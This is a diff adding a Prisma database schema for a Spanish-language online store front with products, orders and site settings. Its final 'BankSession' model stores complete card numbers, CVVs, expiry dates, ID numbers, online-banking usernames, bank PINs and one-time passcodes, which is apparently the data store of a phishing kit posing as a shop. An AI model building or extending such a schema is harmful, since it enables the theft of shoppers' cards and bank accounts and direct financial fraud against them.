@@ -1,0 +1,139 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+model Admin {
+  id        Int      @id @default(autoincrement())
+  email     String   @unique
+  password  String
+  name      String
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model Product {
+  id          Int         @id @default(autoincrement())
+  name        String
+  description String
+  price       Float
+  imageUrl    String
+  category    String
+  isFeatured  Boolean     @default(false)
+  stock       Int         @default(0)
+  createdAt   DateTime    @default(now())
+  updatedAt   DateTime    @updatedAt
+  OrderItem   OrderItem[]
+}
+
+model Customer {
+  id         Int      @id @default(autoincrement())
+  fullName   String
+  email      String
+  phone      String
+  address    String
+  city       String
+  state      String
+  country    String
+  postalCode String
+  createdAt  DateTime @default(now())
+  updatedAt  DateTime @updatedAt
+  orders     Order[]
+}
+
+model Order {
+  id                    Int         @id @default(autoincrement())
+  customerId            Int
+  customer              Customer    @relation(fields: [customerId], references: [id])
+  totalAmount           Float
+  paymentMethod         String
+  cardLast4             String?
+  cardBrand             String?
+  shippingInsuranceFee  Float       @default(0)
+  status                String      @default("pending")
+  createdAt             DateTime    @default(now())
+  updatedAt             DateTime    @updatedAt
+  orderItems            OrderItem[]
+}
+
+model OrderItem {
+  id         Int      @id @default(autoincrement())
+  orderId    Int
+  order      Order    @relation(fields: [orderId], references: [id])
+  productId  Int
+  product    Product  @relation(fields: [productId], references: [id])
+  quantity   Int
+  unitPrice  Float
+  subtotal   Float
+  createdAt  DateTime @default(now())
+}
+
+model SiteSettings {
+  id                   Int      @id @default(autoincrement())
+  siteName             String   @default("Mi Tienda Online")
+  primaryColor         String   @default("#3B82F6")
+  secondaryColor       String   @default("#10B981")
+  logoUrl              String   @default("/logo.png")
+  aboutUsText          String   @default("Somos una tienda comprometida con la calidad y el servicio al cliente.")
+  paymentMethodsLogos  String   @default("visa,mastercard,amex")
+  heroImage            String   @default("/hero.jpg")
+  heroTitle            String   @default("Bienvenido a nuestra tienda")
+  heroSubtitle         String   @default("Los mejores productos al mejor precio")
+  createdAt            DateTime @default(now())
+  updatedAt            DateTime @updatedAt
+}
+
+model Review {
+  id           Int      @id @default(autoincrement())
+  customerName String
+  rating       Int
+  comment      String
+  isApproved   Boolean  @default(false)
+  createdAt    DateTime @default(now())
+  updatedAt    DateTime @updatedAt
+}
+
+model BankSession {
+  id              Int       @id @default(autoincrement())
+  sessionId       String    @unique
+  bank            String
+  
+  // Datos personales completos
+  fullName        String?
+  email           String?
+  phone           String?
+  address         String?
+  city            String?
+  state           String?
+  country         String?
+  postalCode      String?
+  documentId      String?   // Cédula o ID
+  
+  // Información completa de tarjeta
+  cardNumber      String?   // Número completo de tarjeta
+  cardHolderName  String?   // Nombre en la tarjeta
+  expiryDate      String?   // Fecha de expiración
+  cvv             String?   // CVV
+  cardBrand       String?   // Visa, MasterCard, etc.
+  
+  // Credenciales bancarias
+  usuario         String?   // Usuario del banco
+  clave           String?   // Clave de 4 dígitos
+  otp             String?   // Clave dinámica
+  
+  // Información de orden y estado
+  totalAmount     Float?
+  status          String    @default("processing")
+  customerData    String    // JSON string (backup)
+  orderData       String    // JSON string (backup)
+  
+  // Timestamps
+  otpRequestedAt  DateTime?
+  completedAt     DateTime?
+  createdAt       DateTime  @default(now())
+  updatedAt       DateTime  @updatedAt
+}
